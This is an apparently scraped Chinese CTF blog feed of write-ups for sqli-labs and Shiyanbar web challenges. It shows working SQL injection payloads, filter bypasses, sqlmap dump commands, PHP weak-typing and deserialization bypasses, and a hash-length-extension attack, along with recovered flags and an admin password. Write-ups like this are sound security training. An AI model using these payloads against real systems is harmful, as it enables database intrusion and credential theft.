‘“1\”) LIMIT 0,1’ at line 1<br>错误分析：</p><pre><code>near &#39;&quot;3\&quot;) LIMIT 0,1&#39; at line 1</code></pre><p>先分离最外层的单引号，那是用来标识错误信息的</p><pre><code>near &#39;           &quot;  3\  &quot;) LIMIT 0,1             &#39; at line 1</code></pre><p>其中 3\ 是手动输入的，还剩下””)</p><p>说明sql语句中应该有 (“”)   （ 括号也配对）</p><p>再次猜测sql语句：</p><pre><code>select * username,password from table where id = (&quot;input&quot;)</code></pre><p>2.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-4/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-4/?id=-1</a>“) UNION SELECT 1,2,3 –+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170145_156.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlilabs </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>实验吧web—writeup</title>
      <link href="/archives/79216fa/"/>
      <url>/archives/79216fa/</url>
      
        <content type="html"><![CDATA[<h1 id="实验吧web—writeup"><a href="#实验吧web—writeup" class="headerlink" title="实验吧web—writeup"></a>实验吧web—writeup</h1><p>[toc]</p><h3 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h3><p><a href="http://ctf5.shiyanbar.com/10/main.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/10/main.php</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181631_235.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181631_176.png" alt=""></p><h3 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h3><p>查看修改或添加HTTP请求头响应头<br>改X-Forwarded-For: 1.1.1.1<br><a href="http://ctf5.shiyanbar.com/phpaudit/" target="_blank" rel="external">http://ctf5.shiyanbar.com/phpaudit/</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181634_594.png" alt=""><br>burp抓包改改X-Forwarded-For: 1.1.1.1<br> <img src="http://oy0tigw51.bkt.clouddn.com/201803181643_54.png" alt=""></p><h3 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h3><p><a href="http://ctf5.shiyanbar.com/basic/inject" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject</a> </p><p>注库名<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ –dbs </p><p>回显</p><p>available databases [2]:<br>[<em>] information_schema<br>[</em>] test<br>注表名</p><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ -D “test” –tables –level 5<br>回显</p><p>Database: test<br>[1 table]<br>+——-+<br>| admin |<br>+——-+<br>注字段名</p><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ -D “test” -T “admin” –columns –level 5<br>回显</p><p>Database: test<br>Table: admin<br>[2 columns]<br>+———-+————–+<br>| Column   | Type         |<br>+———-+————–+<br>| password | varchar(100) |<br>| username | varchar(100) |<br>+———-+————–+<br>直接注密码内容</p><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ -D “test” -T “admin” -C “password” –dump –level 5<br>回显</p><p>Database: test<br>Table: admin<br>[1 entry]<br>+———-+<br>| password |<br>+———-+<br>| idnuenna |<br>+———-+<br>直接登录即可获得flag，</p><p>账号 admin 密码 idnuenna<br>获得key</p><p>恭喜你密码正确！ KEY :!@#WwwN5f0cu5coM</p><h3 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h3><p>Content-Row:响应头内容<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181759_121.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181800_592.png" alt=""></p><h3 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h3><p><a href="http://ctf5.shiyanbar.com/sHeader/" target="_blank" rel="external">http://ctf5.shiyanbar.com/sHeader/</a><br>进入之后给了提示,需要满足三个条件</p><ol><li>安装 .NET 9.9</li><li>使用IE浏览器访问</li><li>要在英国<br>根据提示和题目名称呢，可以判断要修改http头</li></ol><p>于是乎构造</p><p>User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/5.0) .NET CLR 9.9<br>Accept-Language: en-gb;</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803181805_551.png" alt=""></p><h3 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单!"></a>这个看起来有点简单!</h3><p>Sqlmap -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db –tables<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181824_480.png" alt=""><br>sqlmap.py -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db -T thiskey –columns<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181824_242.png" alt=""></p><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db -T thiskey -C k0y –dump<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181825_659.png" alt=""><br> 爆字段得到key：whatiMyD91dump</p><p>方法二：<br>输入id=1 and 1=1 显示正常<br>输入id=1 and 1=2 回显错误<br>判断存在SQL注入漏洞（恩）<br>然后判断字段数<br>id=1 order by 1 可以，id=1 order by 2 可以，id=1 order by 3 不行！<br>所以字段数位2<br>id=1 union select 1 错误，id=1 union select 1,2 可以<br>所以字段数位2<br>然后开始爆数据库<br>id=1 union select 1,schema_name from information_schema.schemata</p><p>我们看到爆出了三个库：information_schema、my_db、test</p><p>接下来就是爆my_db的表名(就这个库名比较特别，就它了)<br>id=1 union select 1,table_name from information_schema.tables where table_schema=’my_db’</p><p>在my_db库里面爆出了两个表：news、thiskey<br>对了，thiskey在这里，然后就尝试爆列名</p><p>id=1 union select 1,column_name from information_schema.columns where table_schema=’my_db’</p><p>应该就是k0y了，试试看</p><p>id=1 union select 1,k0y from thiskey</p><h3 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h3><pre><code>&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) {  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);  exit();}$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;){  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;  echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;;}?&gt;&lt;br&gt;&lt;br&gt;Can you authenticate to this website?</code></pre><p>要将hackerDJ进行两次url编码才可满足两个条件</p><p>hackerDJ</p><p>%68%61%63%6B%65%72%44%4A</p><p>%2568%2561%2563%256B%2565%2572%2544%254A<br>提交即可获得flag</p><p><a href="http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256B%2565%2572%2544%254A" target="_blank" rel="external">http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256B%2565%2572%2544%254A</a><br>回显<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181831_78.png" alt=""></p><p>flag: DUTCTF{PHP_is_the_best_program_language}</p><h3 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h3><p>直接复制到浏览器的console运行即可<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181833_337.png" alt=""></p><h3 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h3><pre><code>//$_POST[user]意思是读取用户在提交表单时输入的user值，$_POST[PASS]同理//如果二者的值都不为空if($_POST[user] &amp;&amp; $_POST[pass]) {    //连接数据库    $conn = mysql_connect(&quot;********&quot;, &quot;*****&quot;, &quot;********&quot;);    //选择数据库，如果出错，打印错误信息并终止代码运行    mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);    if ($conn-&gt;connect_error) {        die(&quot;Connection failed: &quot; . mysql_error($conn));} //将用户输入的user值存储到user变量$user = $_POST[user];//将用户输入的pass值，使用md5 hash后，存入pass变量$pass = md5($_POST[pass]);//从表php中查找pw的值//后半句的意思是：只保留user值为$user那一行的查找结果 $sql = &quot;select pw from php where user=&#39;$user&#39;&quot;;//查询语句的运行结果存入变量query之中$query = mysql_query($sql);//如果找不到，报错并终止if (!$query) {    printf(&quot;Error: %s\n&quot;, mysql_error($conn));    exit();}//提取出query的值并以MYSQL_ASSOC格式存放在row之中$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[&quot;pw&quot;];//如果row[pw]的值存在，且pass的值与row[pw]相同，则返回key//strcasecmp是比较两个值大小，返回：-1,0,1  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) {    echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;}//否则返回登录失败else {    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);  }}</code></pre><p>这里pass的值是 用户提交的密码经过MD5hash之后的值 如果二者相同则拿到 key</p><p>找输入输出</p><p>user一项的输出在php代码中如下： $sql = “select pw from php where user=’$user’”; 看起来并未对输入进行过滤，我们试着打入引号，果然报错，证明注入点可用！</p><p>分析</p><p>此时用工具打表的话，意义不大，因为此题目标已经明晰，我们只要让row[pw]的值与pass经过md5之后的值相等即可。 而$pass经过md5之后的值是我们可以通过正常输入控制的。 同时，row[pw]的值是从$sql提取出来的 因此，目标就一句话：只要我们能够修改$sql的值，此题解决。 再次审视注入点：$sql = “select pw from php where user=’$user’”; 在这里我们可以利用sql语句，直接给$sql返回一个值。 也就是说，不需要访问题里的数据库，只要我们修改了$sql的值，此题解决.</p><p>构造</p><p>最终user的框里输入的内容为： ‘AND 0=1 UNION SELECT “c4ca4238a0b923820dcc509a6f75849b” #</p><p>最前面的单引号：闭合原文的where user=’<br>AND 0=1:为了使前面的表达式返回值为空 从而使select pw from php where user=’’ AND 0=1这句话完全没用<br>接着我们使用UNION SELECT “c4ca4238a0b923820dcc509a6f75849b”，直接把MD5值作为返回值retuen给$sql<br>c4ca4238a0b923820dcc509a6f75849b这串MD5值是数字1经过MD5 hash之后的结果<br>最后的#用来注释掉后面没用的东西<br>最终，将’AND 0=1 UNION SELECT “c4ca4238a0b923820dcc509a6f75849b” #输入到user框里，将数字1输入到pass框里，登录成功。<br>或者user=’and 1=0 union select md5(1) #&amp;pass=1<br>key：SimCTF{youhaocongming}<br><img src="http://oy0tigw51.bkt.clouddn.com/201803192336_939.png" alt=""></p><h3 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201803192339_352.png" alt=""></p><p>方法一：</p><pre><code>&lt;?php      $_code = &quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;      $_code = str_rot13($_code);      $_code = strrev($_code);      $_code = base64_decode($_code);      //echo $_code;      $_ans = &quot;&quot;;      for($x = 0; $x &lt; strlen($_code); $x++) {          $t = substr($_code, $x, 1);          $t1 = ord($t) - 1;          $t = chr($t1);          $_ans = $_ans . $t;      }      $_ans = strrev($_ans);      echo $_ans;  ?&gt;</code></pre><p>方法二：</p><pre><code>&lt;?php$str=&#39;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#39;;$_out=&#39;&#39;;$_in= base64_decode (strrev(str_rot13 ($str)));        for($_start=0;$_start&lt;strlen($_in);$_start++){                $_c=substr($_in,$_start,1);                $__=ord($_c)-1;                $_c=chr($__);                $_out=$_out.$_c;        }    echo strrev($_out);?&gt;</code></pre><h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201803200102_440.png" alt=""><br>burp抓包，修改为 uploads/1.php .jpg<br>转到hex编码，将空格20，改为00<br>00截断<br><img src="http://oy0tigw51.bkt.clouddn.com/201803200104_758.png" alt=""></p><h3 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h3><p>PHP代码审计<br>hint：sha1函数你有认真了解过吗？听说也有人用md5碰撞o(╯□╰)o<br>解题链接： <a href="http://ctf5.shiyanbar.com/web/false.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/false.php</a> </p><pre><code>&lt;?phpif (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) {    if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])        echo &#39;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#39;;    else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))      die(&#39;Flag: &#39;.$flag);    else        echo &#39;&lt;p&gt;Invalid password.&lt;/p&gt;&#39;;}else{    echo &#39;&lt;p&gt;Login first!&lt;/p&gt;&#39;;?&gt;</code></pre><p>get获得参数name和passowrd，要获得flag，就要让两个参数不相等，但是两个参数的sha1()相等。<br>此处考察了一个知识点，MD5，sha1等hash函数在对数组进行加密的时候会返回FALSE，<br>这里可以运用数组绕过，sha1的参数必须为字符串，如果为其他的类型，则会直接返回FLASE，让两个参数都为数组的形式，就可以FALSE===FALSE，输出flag。当我们传入name[]=1&amp;password[]=2时，会造成<code>sha1(Array) === sha1(Array)</code>，即<code>NULL===NULL</code>，从而吐出flag</p><p>?name[]=1&amp;password[]=2<br>Flag: CTF{t3st_th3_Sha1}</p><h3 id="Guess-Next"><a href="#Guess-Next" class="headerlink" title="Guess Next"></a>Guess Next</h3><p>写个算法没准就算出来了，23333<br>hint：你确定你有认真看判断条件？</p><p>解题链接： <a href="http://ctf5.shiyanbar.com/web/Session.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/Session.php</a>  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803200117_574.png" alt=""><br>burpsuite抓包，将phpsessid置空，并get参数password为空就行。。<br><img src="http://oy0tigw51.bkt.clouddn.com/201803200118_840.png" alt=""><br> CTF{Cl3ar_th3_S3ss1on}</p><h3 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h3><p>啊拉？又是php审计。已经想吐了。<br>hint：ereg()函数有漏洞哩；从小老师就说要用科学的方法来算数。<br>解题链接： <a href="http://ctf5.shiyanbar.com/web/more.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/more.php</a> </p><pre><code>&lt;?phpif (isset ($_GET[&#39;password&#39;])) {    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)    {        echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;;    }    else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)    {        if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE)        {            die(&#39;Flag: &#39; . $flag);        }        else        {            echo(&#39;&lt;p&gt;*-* have not been found&lt;/p&gt;&#39;);        }    }    else    {        echo &#39;&lt;p&gt;Invalid password&lt;/p&gt;&#39;;    }}?&gt;</code></pre><p>1.ereg漏洞：首先第一层检查需要绕过ereg漏洞，百度可以知道存在截断的问题，ereg读到%00的时候，就截止了</p><p>2.strlen()限制了长度小于8并且大小必须大于9999999,1e8=100000000 &gt; 9999999</p><p>3.strpos()对password进行匹配，必须含有-，最终才输出flag</p><p>于是构造?password=1e9%00<em>-</em></p><p>Flag: CTF{Ch3ck_anD_Ch3ck}</p><blockquote><p><a href="http://blog.csdn.net/qq_31481187/article/details/60968595" target="_blank" rel="external">http://blog.csdn.net/qq_31481187/article/details/60968595</a></p></blockquote><h3 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h3><p>找回密码<br>格式：SimCTF{ }<br>解题链接： <a href="http://ctf5.shiyanbar.com/10/upload/" target="_blank" rel="external">http://ctf5.shiyanbar.com/10/upload/</a> </p><p>进入网站step1.php，查看源代码，发现一句<meta name="editor" content="Vim"></p><p>vim编辑，可能存在.xxxx.php.swp的备份文件。尝试了.step1.php.swp、.step2.php.swp，都是404，查看step2.php的源码，发现有一个Submit.php，直接访问，提示you are not an admin，访问.submit.php.swp，果然存在，源码如下</p><pre><code>if(!empty($token)&amp;&amp;!empty($emailAddress)){    if(strlen($token)!=10) die(&#39;fail&#39;);    if($token!=&#39;0&#39;) die(&#39;fail&#39;);    $sql = &quot;SELECT count(*) as num from `user` where token=&#39;$token&#39; AND email=&#39;$emailAddress&#39;&quot;;    $r = mysql_query($sql) or die(&#39;db error&#39;);    $r = mysql_fetch_assoc($r);    $r = $r[&#39;num&#39;];    if($r&gt;0){        echo $flag;    }else{        echo &quot;you are not an admin&quot;;    }}</code></pre><p>邮箱为admin的邮箱，要求token长度为10，且token需要等于零。</p><p>邮箱在step1.php中有提到<meta name="admin" content="admin@simplexue.com"></p><p>token验证可以用php中的0exxxxxxxx绕过。</p><p>payload：?emailAddress=admin@simplexue.com&amp;token=0e11111111</p><p>flag：SimCTF{huachuan_TdsWX}</p><h3 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201803200134_866.png" alt=""><br>让username的MD5和0相等，可以让MD5以0e开头。<br><a href="http://www.cnblogs.com/Primzahl/p/6018158.html" target="_blank" rel="external">PHP处理0e开头md5哈希字符串缺陷/bug</a></p><p>username输入QNKCDZO，得到/user.php?fame=hjkleffifer，访问页面看到一段php源码。</p><pre><code>$unserialize_str = $_POST[&#39;password&#39;]; $data_unserialize = unserialize($unserialize_str); if($data_unserialize[&#39;user&#39;] == &#39;???&#39; &amp;&amp; $data_unserialize[&#39;pass&#39;]==&#39;???&#39;) {    print_r($flag); }</code></pre><p>这段php将post的password值进行了反序列化，得到了一个数组，将数组的user和pass的值和???进行了比较。比较用到了php的弱类型，bool类型的true跟任意字符串可以弱类型相等<br>因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。（a代表array，s代表string，b代表bool，而数字代表个数/长度）<br>payload:post：a:2:{s:4:”user”;b:1;s:4:”pass”;b:1;}</p><p>flag:ctf{dwduwkhduw5465}</p><h3 id="Forms-1"><a href="#Forms-1" class="headerlink" title="Forms"></a>Forms</h3><p>查看网页源代码。</p><pre><code>&lt;input type=&quot;hidden&quot; name=&quot;showsource&quot; value=0&gt;</code></pre><p>将type中的hidden去掉，并赋值value=1，提交，就能看到源代码了。</p><pre><code>$a = $_POST[&quot;PIN&quot;];if ($a == -19827747736161128312837161661727773716166727272616149001823847) {    echo &quot;Congratulations! The flag is $flag&quot;;} else {    echo &quot;User with provided PIN not found.&quot;; }</code></pre><p>让a等于对应的数字，就能得到flag。</p><p>flag：ctf{forms_are_easy}</p><h3 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h3><p>题目的意思就是通过改变地址栏访问index.php，但是限制了条件不能使用 ./  ../ \ 而且只能使用小写字母，不可以在php后加点，这里我们可以利用伪静态技术，使用<a href="http://ctf5.shiyanbar.com/indirection/index.php/index.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/indirection/index.php/index.php</a><br>index.php后的index.php会被当做参数处理，所以服务器只会解析第一个index.php，满足条件成功绕过。</p><p>URL重写，其实就是把带一大堆参数的url，变成一个看上去很规矩的url,主要目的是为了搜索引擎。</p><h3 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h3><p>先用burpsuite抓包，发现setcookie中有source=0，在cookie中赋值，将其改为1，得到源代码。<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201255_194.png" alt=""></p><pre><code>$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];if (!empty($_COOKIE[&quot;getmein&quot;])) {    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {            echo &quot;Congratulations! You are a registered user.\n&quot;;            die (&quot;The flag is &quot;. $flag);        }        else {            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);        }    }    else {        die (&quot;You are not an admin! LEAVE.&quot;);    }}setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[&quot;source&quot;])) {    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));}else {    if ($_COOKIE[&quot;source&quot;] != 0) {        echo &quot;&quot;; // This source code is outputted here    }}</code></pre><p>samlpe-hash是15位的secret+adminadmin的md5值，要获得flag，要让cookie中的getmein值等于secret+username+password的md5值，password又不能等于admin，所以要利用哈希扩展攻击，这里直接用的hashpump工具。</p><pre><code>hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a admin</code></pre><p>输出结果</p><pre><code>e18dfd8404515016d3aeeea2aa196909admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin</code></pre><p>将\x换成%并填入对应位置。<br>hash2</p><p>flag：CTF{cOOkieS_4nd_hAshIng_G0_w3LL_t0g3ther}</p><p>打开网页，查看源代码，获得提示<!-- please post what you find with parameter:key -->，让我们post参数key。</p><p>抓包发现header头中有经过base64编码的flag参数，<br><img src="http://oy0tigw51.bkt.clouddn.com/201803200157_179.png" alt=""><br>将参数解码P0ST_THIS_T0_CH4NGE_FL4G:9x3PyMMd9，将参数9x3PyMMd9post却没有结果，题目中说尽快的提交，猜测与时间有关，用python脚本解</p><pre><code>import requests,refrom base64 import b64decodes = requests.Session()url = &#39;http://ctf5.shiyanbar.com/web/10/10.php&#39;r = s.get(url)head = r.headersflag = b64decode(head[&#39;flag&#39;]).split(&#39;:&#39;)[1]r1 = s.post(url, data={&#39;key&#39;:flag})print r1.text</code></pre><h3 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h3><p>1.判断<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201346_982.png" alt=""><br>2.判断过滤<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1 and 1=1<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201347_373.png" alt=""></p><blockquote><p>过滤空格方法</p><ol><li>注释/<strong>/绕过空格     select user() from d     变成`select/</strong>/user()/<strong>/from/</strong>/`</li><li>括号绕过空格     select user() from dual where 1=1 and 2=2     变成     select(user())from dual where(1=1)and(2=2)</li><li>使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a</li></ol></blockquote><pre><code>对页面输入下面的测试项测试过滤规则测试项    输入    是否过滤逗号    ,&#39;    否注释符#    #&#39;    是注释符 --    --&#39;    是注释符/**/    /**/&#39;    否updatexml函数    updatexml &#39;    否select    select&#39;    否select    select &#39;    是select    select/**/&#39;    否select    /*!select*/    否or    or&#39;    否and    and&#39;    否concat    concat &#39;    否group_concat    group_concat&#39;    是group_concat    /*groupt_concat*/&#39;    是group_concat    groupgroup_concat_concat&#39;    否</code></pre><p>3.判断有那些数据库：</p><pre><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;/**/union/**/select/**/schema_name/**/from/**/information_schema.schemata/**/where/**/&#39;1&#39;=&#39;1</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803201407_844.png" alt=""></p><ol><li>查看有哪些数据表：<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’/<strong>/union/</strong>/select/<strong>/table_name/</strong>/from/<strong>/information_schema.tables/</strong>/where/<strong>/‘1’=’1<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201415_889.png" alt=""><br> 发现了flag的表，我们猜测应该是在web1数据库中并且字段就是flag（其实就在本页面的数据库中）<br>故：<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’/</strong>/union/<strong>/select/</strong>/flag/<strong>/from/</strong>/web1.flag/<strong>/where/</strong>/‘1’=’1<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201419_771.png" alt=""><br>方法二：<br>双空格双查询<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’  unionunion  selectselect  flag  fromfrom  flag  wherewhere ‘1’=’1</li></ol><p>###简单的sql注入之2<br>用?id=1 and 1=1测试，返回SQLi detected!，这是过滤了and？又尝试了很多关键字，都返回SQLi detected!，那可能是过滤了空格。<br>绕过空格<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201422_573.png" alt=""><br>payload</p><pre><code>http://ctf5.shiyanbar.com/web/index_2.php/?id=1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803201437_337.png" alt=""></p><h3 id="简单的sql注入之3"><a href="#简单的sql注入之3" class="headerlink" title="简单的sql注入之3"></a>简单的sql注入之3</h3><p>注库名</p><pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/web/index_3.php?id=1&quot; --dbs</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803201444_689.png" alt=""></p><p>当前数据库<br>Sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php/?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php/?id=1</a>“ –current-db</p><p>注表名<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ -D “web1” –tables<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201453_629.png" alt=""></p><p>注字段<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ -D “web1” -T “flag” –columns<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201457_156.png" alt=""><br>注内容<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=123" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=123</a>“ -D “web1” -T “flag” -C “flag” –dump<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201517_635.png" alt=""></p><p>flag{Y0u_@r3_5O_dAmn_90Od}</p><h3 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h3><p><a href="http://ctf5.shiyanbar.com/web/pcat/source.txt" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/pcat/source.txt</a></p><pre><code>&lt;?phperror_reporting(0);if (!isset($_POST[&#39;uname&#39;]) || !isset($_POST[&#39;pwd&#39;])) {  echo &#39;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;input type=&quot;submit&quot; /&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;/form&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;!--source: source.txt--&gt;&#39;.&quot;&lt;br/&gt;&quot;;    die;}function AttackFilter($StrKey,$StrValue,$ArrReq){      if (is_array($StrValue)){        $StrValue=implode($StrValue);    }    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1){           print &quot;水可载舟，亦可赛艇！&quot;;        exit();    }}$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;foreach($_POST as $key=&gt;$value){     AttackFilter($key,$value,$filter);}$con = 